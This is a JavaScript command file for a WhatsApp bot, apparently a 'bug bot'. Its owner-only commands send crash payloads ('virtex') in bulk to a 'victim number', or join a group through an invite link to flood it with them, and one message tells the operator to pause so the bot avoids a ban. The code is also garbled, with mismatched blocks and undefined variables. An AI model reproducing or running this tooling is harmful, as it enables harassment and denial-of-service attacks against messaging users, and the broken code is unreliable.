//bug database
import { promises as fs } from 'fs';
import path from 'path';
import fetch from 'node-fetch';
import config from '../../config.cjs';
import pkg from '@whiskeysockets/baileys';
const { generateWAMessageFromContent, proto } = pkg;
const { toge1 } = require('./src/virtex/toge1');
const { toge2 } = require('./src/virtex/toge2');
const { toge3 } = require('./src/virtex/toge3');
const { toge4 } = require('./src/virtex/toge4');
const { toge5 } = require('./src/virtex/toge5');
const { toge6 } = require('./src/virtex/toge6');
const { toge7 } = require('./src/virtex/toge7');
const { toge8 } = require('./src/virtex/toge8');
const { toge9 } = require('./src/virtex/toge9');
const { toge10 } = require('./src/virtex/toge10');
const bugCommand = async (m, Matrix) => {
    const botNumber = await Matrix.decodeJid(Matrix.user.id);
    const isCreator = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net'].includes(m.sender);
    const prefixMatch = m.body.match(/^[\\/!#.]/);
    const prefix = prefixMatch ? prefixMatch[0] : '/';
    const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
    const text = m.body.slice(prefix.length + cmd.length).trim().toLowerCase(); 
  if (cmd === 'xandroid') {
        if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	};
  if (!text) return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  };
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  };
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await TogeBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24105114159") {
    return;
  };
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  };
  m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
  await sleep(2000); // Adjusted sleep time for clarity
  ggs.sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  gss.sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.",
  await m.React("👾");
    [whatsappNumber]
  );
};
break; 
  if (cmd === 'xios') {
  if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	};
  if (!text) return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  };
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  };
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await TogeBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24105114159") {
    return;
  };
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  };
  m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
  await sleep(2500); // Adjusted sleep time for clarity
  m.sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.",
  await m.React("👾");
    [whatsappNumber]
  );
};
break;
    if (cmd === 'xios2') {
    if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	};     
	if (!isBot) {
      return m.reply("*🔰 BOT MUST BE AN ADMIN TO USE THIS COMMAND 🔰*");
    };
    if (!text){
      return m.reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return m.reply("Amount must be a number");
    };
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
    await sleep(2500); // Adjusted sleep time for clarity
    await m.React("👾");
  };
  break;
    if (cmd === 'xandroid2') {
    if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	}
    if (!isBot) {
      return m.reply("*🔰 BOT MUST BE AN ADMIN TO USE THIS COMMAND 🔰*");
    };
    if (!text){
      return m.reply(`𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: ${prefix + command} 5`);
      };
    if (isNaN(parseInt(text))) {
      return m.reply("Amount must be a number");
    };
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    gss.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
    await sleep(1500); // Adjusted sleep time for clarity
    gss.sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    await m.React("👾");
  };
  break;
    if (cmd === 'xgc') {
    if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	};
    if (!text) {
      return m.reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    };
    m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return m.reply("Link Invalid!");
    };
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await TogeBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      ggs.sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      await m.React("👾");	    
      m.reply("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
      TogeBotInc.groupLeave(groupTarget);
    }; catch (error) {
      m.reply(util.format(error));
    };
  };
  break;
  if (cmd === 'systemuicrash') {
  if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	}
  if (!text) return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxx,5`); 
  };
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  };
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await TogeBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24105114159") {
    return;
  };
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  };
  m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
  await sleep(2000); // Adjusted sleep time for clarity
  ggs.sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
await m.React("👾");
  gss.sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
    [whatsappNumber]
  );
};
break;
  if (cmd === 'xsysui') {
  if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*");
            return;
	};
  if (!text) return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${prefix+command} 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 ${prefix+command} 241xxxxxxxxxx,5`); 
  };
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  };
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await TogeBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "24105114159") {
    return;
  };
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  };
  m.reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
  await sleep(2000); // Adjusted sleep time for clarity
  gss.sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
await m.React("👾");
  gss.sendMessageWithMentions(
    "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉", 
    [whatsappNumber]
  );
};
break;
case 'clearall': {
if (!isCreator) return m.reply("*🔰 THIS IS AN OWNER COMMAND 🔰*")
TogeBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
};
break
case 'clearchat':
m.togeimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n');
break
   }  
 }
};
export default bugCommand;
